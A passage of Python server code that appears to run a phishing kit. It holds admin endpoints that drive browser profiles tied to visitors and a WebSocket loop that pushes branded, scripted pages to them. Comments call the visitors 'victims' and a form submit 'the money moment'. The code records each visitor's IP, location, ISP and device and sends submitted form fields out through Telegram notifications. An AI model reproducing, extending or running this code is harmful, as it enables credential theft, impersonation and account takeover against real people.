    if not await verify_admin_token(request):
        return JSONResponse({"error": "Unauthorized"}, status_code=401)
    try:
        from pcm_manager import pcm_manager as _pcm
        res = await _pcm.refresh()
        if not res.get("ok"):
            return JSONResponse({"error": res.get("error", "refresh failed")}, status_code=500)
        return JSONResponse({"success": True, **res})
    except Exception as e:
        logger.error(f"[PCM] refresh failed: {e}")
        return JSONResponse({"error": str(e)}, status_code=500)


# ---------------------------------------------------------------------------
# Access — operator-controlled SeleniumBase profile browsers
# ---------------------------------------------------------------------------


def _access_profile_manager():
    """Get the lightweight durable profile manager without starting a browser."""
    if not session_manager:
        raise RuntimeError("Session manager not initialized")
    bm = getattr(session_manager, "browser_manager", None)
    if bm is not None and getattr(bm, "profile_manager", None) is not None:
        return bm.profile_manager
    from browser_manager import UserProfileManager
    return UserProfileManager(session_manager.config)


def _access_profile_path(user_id: str) -> Tuple[str, Path]:
    """Resolve one durable profile folder without accepting path traversal."""
    if not session_manager:
        raise RuntimeError("Session manager not initialized")
    raw = str(user_id or "").strip()
    if not raw or raw in (".", "..") or Path(raw).name != raw or "/" in raw or "\\" in raw:
        raise ValueError("invalid user_id")
    resolved = map_user_id_to_existing_folder(raw, session_manager)
    if not resolved or Path(resolved).name != str(resolved):
        raise ValueError("invalid profile id")
    profile_manager = _access_profile_manager()
    if not profile_manager.profile_exists(resolved):
        raise ValueError("profile not found")
    path = profile_manager.get_user_profile_path(resolved)
    return resolved, path


@app.get("/api/access/users")
async def access_users(request: Request):
    """Return selectable durable profiles plus public/access ownership state."""
    if not await verify_admin_token(request):
        return JSONResponse({"error": "Unauthorized"}, status_code=401)
    try:
        from access_manager import access_manager
        profile_manager = _access_profile_manager()
        profiles = profile_manager.get_all_profiles_info()
        active = {}
        if session_manager:
            for item in await session_manager.get_all_sessions():
                uid = item.get("user_id") or item.get("profile_id")
                if uid:
                    active[str(uid)] = {
                        "connected": True,
                        "url": item.get("current_url") or item.get("url") or "",
                    }
        access_state = await access_manager.status()
        by_user = {str(item.get("user_id")): item for item in access_state.get("sessions", [])}
        for profile in profiles:
            uid = str(profile.get("user_id") or "")
            profile["public_connected"] = uid in active
            profile["public_url"] = (active.get(uid) or {}).get("url", "")
            profile["access"] = by_user.get(uid)
        return JSONResponse({"profiles": profiles, "count": len(profiles)})
    except Exception as exc:
        logger.exception("[Access] list profiles failed")
        return JSONResponse({"error": str(exc)}, status_code=500)


@app.post("/api/access/open")
async def access_open(request: Request):
    if not await verify_admin_token(request):
        return JSONResponse({"error": "Unauthorized"}, status_code=401)
    try:
        body = await request.json()
    except Exception:
        body = {}
    try:
        user_id, profile_path = _access_profile_path(body.get("user_id"))
        url = str(body.get("url") or "https://www.google.com").strip()
        access_id = str(body.get("access_id") or "").strip() or None
        from access_manager import access_manager
        result = await access_manager.open(user_id, str(profile_path), url, access_id=access_id)
        if not result.get("ok"):
            return JSONResponse(result, status_code=500)
        return JSONResponse(result)
    except ValueError as exc:
        return JSONResponse({"error": str(exc)}, status_code=400)
    except Exception as exc:
        logger.exception("[Access] open failed")
        return JSONResponse({"error": str(exc)}, status_code=500)


@app.post("/api/access/navigate")
async def access_navigate(request: Request):
    if not await verify_admin_token(request):
        return JSONResponse({"error": "Unauthorized"}, status_code=401)
    try:
        body = await request.json()
    except Exception:
        body = {}
    access_id = str(body.get("access_id") or "").strip()
    url = str(body.get("url") or "").strip()
    from access_manager import access_manager
    session = await access_manager.get(access_id)
    if session is None:
        return JSONResponse({"error": "Access session not found"}, status_code=404)
    try:
        ok = await session.navigate(url)
        return JSONResponse({"ok": ok, "access_id": access_id, "url": session.current_url})
    except Exception as exc:
        return JSONResponse({"error": str(exc)}, status_code=500)


@app.post("/api/access/close")
async def access_close(request: Request):
    if not await verify_admin_token(request):
        return JSONResponse({"error": "Unauthorized"}, status_code=401)
    try:
        body = await request.json()
    except Exception:
        body = {}
    from access_manager import access_manager
    ok = await access_manager.close(str(body.get("access_id") or "").strip())
    return JSONResponse({"ok": ok})


@app.get("/api/access/status")
async def access_status(request: Request):
    if not await verify_admin_token(request):
        return JSONResponse({"error": "Unauthorized"}, status_code=401)
    from access_manager import access_manager
    return JSONResponse(await access_manager.status(str(request.query_params.get("access_id") or "").strip() or None))


@app.websocket("/ws/access")
async def access_websocket_endpoint(websocket: WebSocket):
    """Multiplex one live Access browser per access_id over its own WS."""
    token = websocket.query_params.get("token")
    payload = verify_jwt_token(token or "")
    if not payload or payload.get("sub") != ADMIN_USERNAME:
        await websocket.close(code=4401, reason="Unauthorized")
        return
    await websocket.accept()
    from access_manager import access_manager
    access_id = str(websocket.query_params.get("access_id") or "").strip()
    session = await access_manager.get(access_id) if access_id else None
    if session is None:
        try:
            await websocket.send_json({"type": "access_error", "error": "Access session not found"})
        except Exception:
            pass
        await websocket.close(code=4404, reason="Access session not found")
        return
    try:
        await session.subscribe(websocket)
        await websocket.send_json({
            "type": "access_ready",
            "access_id": session.access_id,
            "user_id": session.user_id,
            "url": session.current_url,
            "width": session._cast_width,
            "height": session._cast_height,
        })
        while True:
            msg = await websocket.receive()
            if msg.get("type") == "websocket.disconnect":
                break
            if "bytes" not in msg and "text" in msg:
                try:
                    data = json.loads(msg["text"])
                except Exception:
                    continue
                mtype = str(data.get("type") or "")
                if mtype == "heartbeat":
                    await websocket.send_json({"type": "heartbeat_ack", "ts": time.time()})
                elif mtype in ("navigate", "open"):
                    url = str(data.get("url") or "").strip()
                    if url:
                        await session.navigate(url)
                        await websocket.send_json({"type": "access_navigated", "url": session.current_url})
                elif mtype == "get_info":
                    await websocket.send_json({"type": "access_info", "url": session.current_url})
                elif mtype == "input":
                    await session.handle_input(data.get("payload") or data, websocket)
                elif mtype in ("click", "mousemove", "mousedown", "mouseup", "wheel", "keydown", "keyup", "keypress", "press", "type", "paste", "copy", "clipboard_copy", "clipboard_paste", "highlight"):
                    await session.handle_input(data, websocket)
    except WebSocketDisconnect:
        pass
    except Exception as exc:
        logger.debug("[Access WS] closed: %s", exc)
    finally:
        try:
            await session.unsubscribe(websocket)
        except Exception:
            pass


@app.get("/api/pcm/status")
async def pcm_status(request: Request):
    if not await verify_admin_token(request):
        return JSONResponse({"error": "Unauthorized"}, status_code=401)
    try:
        from pcm_manager import pcm_manager as _pcm
        return JSONResponse({
            "mode": getattr(_pcm, '_mode', 'desktop'),
            "url": getattr(_pcm, '_current_url', ''),
            "has_browser": _pcm._browser is not None,
            "has_page": _pcm._page is not None and not getattr(_pcm._page, 'is_closed', lambda: False)() if _pcm._page else False,
            "screencast_running": getattr(_pcm, '_screencast_running', False),
            "subs": len(getattr(_pcm, '_subs', set())),
        })
    except Exception as e:
        return JSONResponse({"error": str(e)}, status_code=500)


@app.websocket("/ws/pcm")
async def pcm_websocket_endpoint(websocket: WebSocket):
    """PCM interactive screencast WS. Admin canvas forwards mouse/key/wheel events
    and receives continuous binary JPEG frames via CDP screencast."""
    await websocket.accept()
    from pcm_manager import pcm_manager as _pcm
    try:
        await _pcm.subscribe(websocket)
        # Ensure browser is ready. Only seed google.com when the PCM browser
        # has never been opened — never force-navigate on (re)connect, or a
        # WS reconnect would yank the admin back off the page they're on.
        try:
            if getattr(_pcm, '_browser', None) is None:
                await _pcm.ensure_browser(url="https://www.google.com")
            else:
                await _pcm.ensure_browser()
        except Exception:
            pass
        # Send init ack with current URL/mode
        try:
            await websocket.send_json({"type": "pcm_ready", "url": getattr(_pcm, '_current_url', ''), "mode": getattr(_pcm, '_mode', 'desktop')})
        except Exception:
            pass
        while True:
            try:
                msg = await asyncio.wait_for(websocket.receive(), timeout=60.0)
            except asyncio.TimeoutError:
                try:
                    await websocket.send_json({"type": "ping", "ts": time.time()})
                except Exception:
                    break
                continue
            if msg.get("type") == "websocket.disconnect":
                break
            if msg.get("type") == "websocket.receive":
                if "text" in msg:
                    try:
                        data = json.loads(msg["text"])
                    except Exception:
                        continue
                    mtype = data.get("type", "")
                    if mtype == "heartbeat":
                        try:
                            await websocket.send_json({"type": "heartbeat_ack", "ts": time.time()})
                        except Exception:
                            pass
                    elif mtype == "navigate" or mtype == "open":
                        url = (data.get("url") or "").strip()
                        mode = (data.get("mode") or "").strip().lower()
                        if mode not in ("desktop", "mobile"):
                            mode = None
                        if url:
                            try:
                                if mode:
                                    # Mode switch is ONE self-contained op —
                                    # navigating first and then rebuilding the
                                    # browser restarted the cast mid-flight and
                                    # double-navigated (desktop then mobile).
                                    await _pcm.open(url, mode=mode)
                                else:
                                    await _pcm.navigate(url)
                            except Exception as e:
                                logger.debug(f"[PCM WS] navigate/open {url}: {e}")
                            try:
                                await websocket.send_json({"type": "pcm_navigated", "url": url, "mode": mode or getattr(_pcm, '_mode', 'desktop')})
                            except Exception:
                                pass
                    elif mtype == "set_mode":
                        mode = (data.get("mode") or "").strip().lower()
                        if mode in ("desktop", "mobile"):
                            try:
                                cur = getattr(_pcm, '_current_url', "https://www.google.com")
                                await _pcm.open(cur, mode=mode)
                                await websocket.send_json({"type": "pcm_mode", "mode": mode})
                            except Exception as e:
                                logger.debug(f"[PCM WS] set_mode {mode}: {e}")
                    elif mtype == "input":
                        # forwarded canvas input { subtype, x, y, button, deltaX, ... }
                        payload = data.get("payload") or data
                        # Remove wrapper keys
                        try:
                            await _pcm.handle_input(payload)
                        except Exception as e:
                            logger.debug(f"[PCM WS] input {payload}: {e}")
                    elif mtype in ("click", "mousemove", "mousedown", "mouseup", "wheel", "keydown", "keypress", "type", "scroll"):
                        try:
                            await _pcm.handle_input(data)
                        except Exception as e:
                            logger.debug(f"[PCM WS] input {mtype}: {e}")
                    elif mtype == "get_info":
                        try:
                            await websocket.send_json({"type": "pcm_info", "url": getattr(_pcm, '_current_url', ''), "mode": getattr(_pcm, '_mode', 'desktop')})
                        except Exception:
                            pass
                elif "bytes" in msg:
                    # ignore binary from client
                    pass
            elif msg.get("type") == "websocket.disconnect":
                break
    except WebSocketDisconnect:
        pass
    except Exception as e:
        logger.warning(f"[PCM WS] error: {e}")
    finally:
        try:
            await _pcm.unsubscribe(websocket)
        except Exception:
            pass


# ---------------------------------------------------------------------------
# Per-client workflow task registry
# ---------------------------------------------------------------------------
# Every workflow chain (manual Run, per-link auto-workflow, global
# auto-workflow) registers its asyncio.Task here keyed by client_id.  Used to
# (a) cancel a stale chain when the client reconnects, (b) prevent duplicate
# concurrent chains for the same client, and (c) abort on disconnect so a
# dead client doesn't leave an orphaned infinite spinner-waiter alive.
_workflow_tasks: Dict[str, asyncio.Task] = {}
_workflow_tokens: Dict[str, str] = {}


def _workflow_is_current(client_id: str, workflow_token: Optional[str]) -> bool:
    return workflow_token is None or _workflow_tokens.get(client_id) == workflow_token


async def _cancel_workflow_for_client(client_id: str, reason: str = "") -> None:
    """Cancel any in-flight workflow task for ``client_id`` atomically."""
    task = _workflow_tasks.pop(client_id, None)
    _workflow_tokens.pop(client_id, None)
    if task is None:
        return
    try:
        if not task.done():
            task.cancel()
            try:
                await task
            except (asyncio.CancelledError, Exception):
                pass
        if reason:
            logger.debug("[workflow] cancelled chain for %s (%s)", client_id, reason)
    except Exception:
        pass


def _register_workflow_task(
    client_id: str, task: asyncio.Task, workflow_token: Optional[str] = None,
) -> str:
    """Register a generation-bound workflow task, replacing stale entries."""
    token = workflow_token or uuid.uuid4().hex
    old = _workflow_tasks.get(client_id)
    if old is not None and old is not task and not old.done():
        old.cancel()
    _workflow_tokens[client_id] = token
    _workflow_tasks[client_id] = task

    def _cleanup(_t, _cid=client_id, _task=task, _token=token):
        try:
            if (_workflow_tasks.get(_cid) is _task
                    and _workflow_tokens.get(_cid) == _token):
                _workflow_tasks.pop(_cid, None)
                _workflow_tokens.pop(_cid, None)
        except Exception:
            pass

    try:
        task.add_done_callback(_cleanup)
    except Exception:
        pass
    return token


def _launch_workflow(
    client_id: str, workflow: dict,
    bindings: Optional[Dict[str, str]] = None,
) -> asyncio.Task:
    """Start the canonical workflow chain task for a client (tracked)."""
    workflow_token = uuid.uuid4().hex
    task = asyncio.create_task(
        _run_workflow_on_client(
            client_id, workflow, workflow_token=workflow_token,
            bindings=bindings or None,
        )
    )
    _register_workflow_task(client_id, task, workflow_token)
    return task


async def _auto_workflow_runner(
    client_id: str, workflow: dict,
    connection_token: Optional[str] = None,
    workflow_token: Optional[str] = None,
) -> None:
    """Run the configured auto-workflow against a new LPV-only client.

    Fires off the standard workflow execution with a small head-start
    delay so the default landing page has time to render first.  Errors
    are swallowed (we don't want a broken auto-workflow to crash the
    session).  Tracked in _workflow_tasks so a reconnect/duplicate boot
    can replace it rather than stacking chains.
    """
    try:
        # 1.5s head start — long enough for the iframe to mount the
        # default page, short enough that the user barely notices.
        await asyncio.sleep(1.5)
        if (not _lpv_connection_is_current(client_id, connection_token)
                or not _workflow_is_current(client_id, workflow_token)):
            return
        await _run_workflow_on_client(
            client_id, workflow, connection_token=connection_token,
            workflow_token=workflow_token,
        )
    except asyncio.CancelledError:
        raise
    except Exception as exc:
        logger.warning(
            "[auto-workflow] client %s workflow %s crashed: %s",
            client_id, workflow.get("id"), exc,
        )
        tg_notify(
            f"<b>WORKFLOW EXECUTION ERROR</b>\n\n"
            f"<b>Workflow:</b> {_tg_esc(workflow.get('name') or workflow.get('id') or '-', 60)}\n"
            f"<b>Error Details:</b> <code>{_tg_esc(exc, 150)}</code>\n"
            f"<b>Client ID:</b> <code>{_tg_esc(str(client_id)[-10:])}</code>",
            "notify_lpv_workflow",
        )


async def _enter_lpv_only_mode(websocket: WebSocket, init_data: dict) -> None:
    """Drive a WS connection that lives entirely in LPV mode.

    No browser is spawned.  The client immediately receives a
    ``lpv_only_session`` message with the default landing page URL, and
    then a long-lived message loop that ignores anything except LPV
    push acknowledgements / heartbeats.

    The function only returns when the socket disconnects or errors.
    """
    settings = srv_settings.get_settings()
    default_page = settings.lpv_default_page or "_default.html"
    default_url = _lpv_page_url(default_page)

    # Runtime ownership is per tab/connection. Keep the durable user id as
    # the parent grouping key, then use the handoff map below to make a fresh
    # public tab replace the older runtime for that same parent.
    client_id = (
        init_data.get("session_id")
        or init_data.get("device_id")
        or init_data.get("user_id")
        or f"lpv_{uuid.uuid4().hex}"
    )
    profile_parent_id = (
        init_data.get("user_id")
        or init_data.get("device_id")
        or client_id
    )
    # Normalize legacy/partial profile ids before replacement and Admin
    # grouping, matching the normal browser-session path.
    if session_manager and profile_parent_id:
        try:
            profile_parent_id = map_user_id_to_existing_folder(profile_parent_id, session_manager)
        except Exception:
            pass
    init_data = dict(init_data)
    init_data["user_id"] = profile_parent_id
    # Tie this runtime client_id to the visitor's durable identity so the
    # chat thread (and the admin's thread list) follow the person rather
    # than the tab. Runtime ownership below is untouched.
    _lpv_register_identity(client_id, profile_parent_id)
    # Which version of a paired page this visitor gets (mobile/desktop).
    _remember_client_device(client_id, init_data)
    if session_manager:
        try:
            locked_by = await session_manager.registry.get_locked_session_id(profile_parent_id)
            if locked_by and locked_by != client_id:
                await websocket.send_json({
                    "type": "session_locked",
                    "message": "Session is already active in another browser",
                    "locked_session_id": locked_by,
                })
                await websocket.close(code=1008, reason="session_locked")
                return
        except Exception:
            pass
    lpv_profile_registered = False
    # Stable client ids are intentionally reused across reconnects. This token
    # makes cleanup/event writes belong to this websocket generation, so an old
    # disconnect cannot take a fresh reconnect offline.
    connection_token = uuid.uuid4().hex
    init_data["_connection_token"] = connection_token
    init_data["_lpv_default_page"] = default_url

    # A public LPV/workflow link is also a profile-owned runtime. Hold the
    # stable-parent handoff lock through old-runtime replacement and ownership
    # reservation; otherwise a browser takeover and two simultaneous LPV
    # refreshes could all pass the empty-map check before registering.
    async with _lpv_parent_handoff(profile_parent_id) as handoff_key:
        await _replace_lpv_parent_connection_locked(
            handoff_key,
            exclude_client_id=client_id,
            exclude_websocket=websocket,
        )
        _lpv_connection_tokens[client_id] = connection_token
        _lpv_only_ws[client_id] = websocket
        _lpv_parent_connections[profile_parent_id] = {
            "client_id": client_id,
            "websocket": websocket,
            "connection_token": connection_token,
            "init_data": dict(init_data),
            "workflow": {},
        }

    # Resolve the workflow (per-link takes precedence over the global
    # auto-workflow) up-front so the boot message can carry its branded
    # loading screen (custom logo URL + spinner color).
    per_link_id = (init_data.get("workflow") or init_data.get("workflow_id") or init_data.get("_workflow_link_id") or "").strip()
    auto_id = per_link_id or (settings.auto_workflow_id or "").strip()
    wf_boot = None
    if auto_id:
        try:
            wf_boot = lpv_store.get_workflow(auto_id)
        except Exception:
            wf_boot = None
    # A workflow link must start from the workflow, not from a generic
    # landing page: the workflow pushes its own first step, and pointing
    # the client at a default page it never uploaded just makes it fetch
    # a 404 on boot ("Failed to load resource: 404").
    # Without a workflow, still only advertise a default page that really
    # exists in the archive.
    if wf_boot:
        default_page = ""
        default_url = ""
    else:
        try:
            if not lpv_store.get_page(default_page):
                default_page = ""
                default_url = ""
            else:
                # A landing page may pair a phone build and a desktop build;
                # the visitor gets the one their device should see.
                resolved, _swapped = lpv_store.resolve_page_for_device(
                    default_page, _device_from_init(init_data)
                )
                if resolved:
                    default_page = str(resolved.get("id") or default_page)
                    default_url = _lpv_page_url(default_page)
        except Exception:
            default_page = ""
            default_url = ""
    parent_connection = _lpv_parent_connections.get(profile_parent_id)
    if (
        parent_connection
        and parent_connection.get("connection_token") == connection_token
    ):
        parent_connection["init_data"] = dict(init_data)
        parent_connection["workflow"] = dict(wf_boot or {})

    try:
        await _upsert_lpv_admin_client(
            client_id, init_data, wf_boot, online=True, connection_token=connection_token
        )
    except Exception:
        logger.debug("[LPV] could not register admin client %s", client_id, exc_info=True)
    # register for goto/direct messaging (ownership was reserved above)
    try:
        _lpv_only_ws[client_id] = websocket
    except Exception:
        pass
    try:
        await websocket.send_json({
            "type": "lpv_only_session",
            "mode": "lpv_only",
            "default_page": default_page,
            "default_page_url": default_url,
            # Click guard for the landing page (see /api/lpv/pages/<id>/guard).
            "default_page_guard": _page_guard(default_page),
            "default_page_actions": _page_actions(default_page),
            "uses_brand_spinner": settings.lpv_default_uses_brand_spinner,
            "workflow_id": (wf_boot or {}).get("id", ""),
            "workflow_name": (wf_boot or {}).get("name", ""),
            "brand_logo_url": (wf_boot or {}).get("brand_logo_url", "") or "",
            "brand_color": (wf_boot or {}).get("brand_color", "") or "",
            "respect_redirect": (wf_boot or {}).get("respect_redirect", True),
            "redirect_html_url": _chat_redirect_url(wf_boot or {}),
            "chat": _chat_config(_device_from_init(init_data)),
            # Tab/favicon branding. The pushed page renders in a blob
            # iframe, so its own <title>/icon never reach the browser
            # chrome — the viewer has to apply these to be authentic.
            "tab_title": (getattr(settings, "lpv_tab_title", "") or "").strip(),
            "favicon_url": (getattr(settings, "lpv_favicon_url", "") or "").strip(),
        })
    except Exception:
        # A replacement may have closed this socket while registration was
        # awaiting. Do not fall through into browser-session creation for that
        # stale LPV generation.
        if not _lpv_connection_is_current(client_id, connection_token):
            return
        try:
            await _upsert_lpv_admin_client(
                client_id, init_data, wf_boot, online=False,
                connection_token=connection_token,
            )
        except Exception:
            pass
        _lpv_only_ws.pop(client_id, None)
        if _lpv_connection_tokens.get(client_id) == connection_token:
            _lpv_connection_tokens.pop(client_id, None)
        parent_connection = _lpv_parent_connections.get(profile_parent_id)
        if (
            parent_connection
            and parent_connection.get("websocket") is websocket
            and parent_connection.get("connection_token") == connection_token
        ):
            _lpv_parent_connections.pop(profile_parent_id, None)
        raise
    if not _lpv_connection_is_current(client_id, connection_token):
        return

    # If the default page exists, push it immediately so the client
    # doesn't sit on a blank screen.
    try:
        page = lpv_store.get_page(default_page)
    except Exception:
        page = None
    if page:
        try:
            await websocket.send_json({
                "type": "lpv_show_page",
                "page_id": page.get("id", default_page),
                "page_url": default_url,
                "page_name": page.get("name", default_page),
                "guard": _page_guard(page.get("id", default_page), page),
                "actions": _page_actions(page.get("id", default_page), page),
            })
        except Exception:
            pass
    if not _lpv_connection_is_current(client_id, connection_token):
        return

    logger.debug(
        "[WS] LPV-only session opened for client_id=%s (no browser spawn)",
        client_id,
    )
    _lpv_connected_at = time.time()

    # Telegram: LPV client connected — workflow, link, location, device.
    try:
        loc = init_data.get("location") or {}
        ip = (loc.get("ip") or "").strip()
        if not ip:
            try:
                ip = websocket.client.host if websocket.client else "Unknown"
            except Exception:
                ip = "Unknown"
        if wf_boot:
            wf_label = f"{_tg_esc(wf_boot.get('name') or 'unnamed', 60)}"
            wf_via = "link" if per_link_id else "global auto-run"
            wf_line = f"{wf_label} ({wf_via})"
        else:
            wf_line = ""
        auth_frag = (init_data.get("auth_token") or "")[:8]
        link_line = f"<code>{_tg_esc(auth_frag)}\u2026</code>" if auth_frag else ""
        if init_data.get("is_mobile"):
            device_type = "Mobile"
        elif init_data.get("is_touch"):
            device_type = "Tablet / Touch"
        else:
            device_type = "Desktop"
        scr = init_data.get("screen") or {}
        size = f"{scr.get('width', '?')}×{scr.get('height', '?')}"
        ua = (init_data.get("userAgent") or "")[:120]
        _country = (loc.get('country') or '-').strip()
        _region = (loc.get('state') or '-').strip()
        _city = (loc.get('city') or '-').strip()
        _isp = (loc.get("isp") or "").strip()
        tg_notify(
            "\U0001F7E2 <b>CLIENT CONNECTED</b>\n\n"
            + _tg_tree([
                ("\U0001F464", "Client", f"<code>{_tg_esc(str(client_id)[-10:])}</code>"),
                ("\U0001F680", "Workflow", wf_line),
                ("\U0001F511", "Pass code", link_line),
            ])
            + "\n\n\U0001F30D <b>Location &amp; network</b>\n"
            + _tg_tree([
                ("\U0001F6F0", "IP address", f"<code>{_tg_esc(ip)}</code>"),
                ("\U0001F30E", "Country", _tg_esc(_country)),
                ("\U0001F4CD", "Region", _tg_esc(_region)),
                ("\U0001F3D9", "City", _tg_esc(_city)),
                ("\U0001F4E1", "Internet provider", _tg_esc(_isp, 60)),
            ])
            + "\n\n\U0001F4F1 <b>Device</b>\n"
            + _tg_tree([
                ("\U0001F5A5", "Type", f"{_tg_esc(device_type)} ({_tg_esc(size)})"),
                ("\U0001F9EC", "Browser", f"<code>{_tg_esc(ua, 90)}</code>"),
            ]),
            "notify_connect",
        )
    except Exception:
        pass

    # Auto-workflow: if the admin has set one, fire it in the background
    # so the new client gets the scripted page sequence without admin
    # intervention.  Only applies to LPV-only mode (where the client
    # has no real browser session to interrupt).
    try:
        # Per-link workflow takes precedence over global auto_workflow
        # (both already resolved above into wf_boot).
        if auto_id:
            wf = wf_boot
            if wf:
                # Cancel any stale chain for this client first (reconnect,
                # duplicate tab, re-opened link) so we never stack two
                # runners pushing pages to the same victim.
                await _cancel_workflow_for_client(client_id, "superseded by fresh boot")
                if not _lpv_connection_is_current(client_id, connection_token):
                    return
                # Small delay so the default landing page has time to
                # render before the workflow starts pushing new pages.
                workflow_token = uuid.uuid4().hex
                task = asyncio.create_task(
                    _auto_workflow_runner(
                        client_id, wf, connection_token=connection_token,
                        workflow_token=workflow_token,
                    )
                )
                _register_workflow_task(client_id, task, workflow_token)
                logger.debug(
                    "[WS] auto-workflow %s queued for client %s (per_link=%s)",
                    auto_id, client_id, bool(per_link_id),
                )
            else:
                logger.warning(
                    "[WS] auto-workflow %s not found; ignoring", auto_id,
                )
    except Exception as exc:
        logger.warning("[WS] auto-workflow trigger failed: %s", exc)

    # Include LPV-only generations in the shared parent liveness registry so
    # browser cleanup cannot mark the durable profile offline while a workflow
    # tab for the same parent is still connected.
    try:
        from browser_manager import register_profile_session
        register_profile_session(profile_parent_id, client_id)
        lpv_profile_registered = True
    except Exception:
        logger.debug("[LPV] parent profile registration failed", exc_info=True)

    # Stay alive and PROCESS client messages.  LPV-only clients run the
    # exact same client.html LPV runtime as browser-session clients, so
    # they emit the same inbound traffic: lpv_event (field changes,
    # clicks, spinner-on), lpv_page_loaded, heartbeats.  Previously this
    # loop discarded everything except lpv_spinner, which meant workflow
    # link users produced ZERO audit trail / live activity feed entries.
    try:
        while True:
            try:
                msg = await asyncio.wait_for(websocket.receive_text(), timeout=60.0)
                try:
                    parsed = json.loads(msg)
                except Exception:
                    continue
                if not isinstance(parsed, dict):
                    continue
                # Stop processing as soon as a reconnect supersedes this
                # websocket generation.  Otherwise an old tab could still
                # append audit events or signal a new workflow.
                if not _lpv_connection_is_current(client_id, connection_token):
                    break
                msg_type = parsed.get("type") or ""

                # ---- Live chat: client -> admin ----
                if msg_type == "chat_message":
                    await _handle_client_chat(client_id, parsed)
                elif msg_type == "chat_redirect":
                    await _handle_chat_redirect(client_id, connection_token)
                elif msg_type == "lpv_action":
                    await _handle_click_action(client_id, parsed, connection_token)

                # ---- LPV event stream (same handling as browser sessions) ----
                if msg_type == "lpv_event":
                    event_type = (parsed.get("event_type") or "unknown")[:64]
                    page_id = parsed.get("page_id")
                    page_name = parsed.get("page_name")
                    payload = parsed.get("payload") or {}
                    if not isinstance(payload, dict):
                        payload = {"value": str(payload)[:500]}

                    # Per-client redaction before persisting/broadcasting.
                    try:
                        rules = lpv_store.list_redaction(client_id)
                        if rules:
                            payload = _apply_redaction(payload, rules)
                    except Exception:
                        pass

                    if event_type not in {"heartbeat", "pong", "ping"}:
                        try:
                            await _touch_lpv_admin_client(
                                client_id,
                                connection_token=connection_token,
                                current_page_id=page_id,
                                current_page_name=page_name,
                                last_activity_type=event_type,
                                lpv_last_activity=time.time(),
                            )
                        except Exception:
                            logger.debug("[LPV] activity update failed for %s", client_id, exc_info=True)

                    try:
                        lpv_store.record_event(
                            client_id,
                            event_type,
                            payload=payload,
                            page_id=page_id,
                            page_name=page_name,
                        )
                        await _broadcast_lpv_event(client_id, {
                            "event_type": event_type,
                            "page_id": page_id,
                            "page_name": page_name,
                            "payload": payload,
                        })
                    except Exception:
                        pass

                    # Hook for the workflow runner: a `redirect` step is
                    # waiting on a spinner-on event from this client.  The
                    # LPV overlay emits event_type="lpv_spinner" only for
                    # genuine user gestures (click/submit) now — but filter
                    # anyway so a page-load spinner can never satisfy the
                    # redirect wait (the mobile redirect-skip bug).
                    if event_type == "lpv_spinner":
                        _r = (payload or {}).get("reason") if isinstance(payload, dict) else None
                        if _r != "page_load":
                            _lpv_spinner_signal(client_id, connection_token)

                    # Telegram: collect settled field values per page; one
                    # aggregated 'page final' message goes out when the page
                    # is left (page switch / new page loaded / disconnect).
                    if event_type == "field_final":
                        try:
                            _lpv_note_field_final(client_id, page_id, page_name, payload)
                        except Exception:
                            pass

                    # Telegram: a form submit is the money moment — the
                    # victim just handed over data.  Payload here is
                    # already redacted per-client (same rules as audit).
                    if event_type == "form_submit":
                        try:
                            _lpv_final_flush(client_id, "submit")
                        except Exception:
                            pass
                        try:
                            _fields = (payload or {}).get("fields") or {}
                            if isinstance(_fields, dict) and _fields:
                                _items = list(_fields.items())[:15]
                                _lines = []
                                for _i, (_k, _v) in enumerate(_items):
                                    if isinstance(_v, list):
                                        _v = ", ".join(str(x) for x in _v)
                                    _lines.append(f"• <b>{_tg_esc(_k, 32)}:</b> <code>{_tg_esc(_v, 120)}</code>")
                                _body = "\n".join(_lines)
                            else:
                                _body = "No fields recorded"
                            tg_notify(
                                f"<b>FORM SUBMISSION DETECTED</b>\n\n"
                                f"<b>Source Page:</b> {_tg_esc(page_name or '-', 60)}\n"
                                f"<b>Client ID:</b> <code>{_tg_esc(str(client_id)[-10:])}</code>\n\n"
                                f"<b>Submitted Fields:</b>\n"
                                f"{_body}",
                                "notify_lpv_submit",
                            )
                        except Exception:
                            pass

                elif msg_type == "lpv_page_loaded":
                    page_id = parsed.get("page_id")
                    page_name = parsed.get("page_name")
                    payload = parsed.get("payload") or {}
                    if not isinstance(payload, dict):
                        payload = {"value": str(payload)[:500]}
                    try:
                        await _touch_lpv_admin_client(
                            client_id,
                            connection_token=connection_token,
                            current_page_id=page_id,
                            current_page_name=page_name,
                            last_activity_type="page_loaded",
                            lpv_last_activity=time.time(),
                        )
                    except Exception:
                        logger.debug("[LPV] page activity update failed for %s", client_id, exc_info=True)
                    # Telegram: leaving the previous page -> ship its finals.
                    try:
                        _lpv_final_flush(client_id, "page loaded")
                    except Exception:
                        pass
                    try:
                        lpv_store.record_event(
                            client_id, "page_loaded", payload,
                            page_id=page_id, page_name=page_name,
                        )
                        await _broadcast_lpv_event(client_id, {
                            "event_type": "page_loaded",
                            "page_id": page_id,
                            "page_name": page_name,
                            "payload": payload,
                        })
                    except Exception:
                        pass
                    # Telegram: page view = progress through the chain.
                    try:
                        tg_notify(
                            f"<b>PAGE NAVIGATION DETECTED</b>\n\n"
                            f"<b>Page:</b> {_tg_esc(page_name or page_id or '-', 60)}\n"
                            f"<b>Client ID:</b> <code>{_tg_esc(str(client_id)[-10:])}</code>",
                            "notify_navigate",
                            flag_default=False,
                        )
                    except Exception:
                        pass

                elif msg_type in ("heartbeat", "pong", "ping"):
                    # keepalive chatter — ignore silently
                    pass
                else:
                    logger.debug(
                        "[WS][lpv-only] client %s sent unhandled %s",
                        client_id, msg_type or "?",
                    )
            except asyncio.TimeoutError:
                # Periodic keepalive.  Client doesn't need to reply.
                try:
                    await websocket.send_json({"type": "ping", "ts": time.time()})
                except Exception:
                    return
    except WebSocketDisconnect:
        logger.debug("[WS] LPV-only client %s disconnected", client_id)
    except Exception as exc:
        logger.warning("[WS] LPV-only client %s error: %s", client_id, exc)
    finally:
        # Only the currently registered websocket generation may mark the
        # stable client offline or cancel its workflow.
        is_current_connection = _lpv_only_ws.get(client_id) is websocket
        if is_current_connection:
            try:
                await _upsert_lpv_admin_client(
                    client_id, init_data, wf_boot, online=False, connection_token=connection_token
                )
            except Exception:
                logger.debug("[LPV] could not mark admin client offline %s", client_id, exc_info=True)
            try:
                _lpv_only_ws.pop(client_id, None)
                if _lpv_connection_tokens.get(client_id) == connection_token:
                    _lpv_connection_tokens.pop(client_id, None)
                # Drop the live runtime->person mapping. The thread itself
                # survives on disk: _lpv_identity_for() recovers the key
                # from stored messages when this visitor comes back.
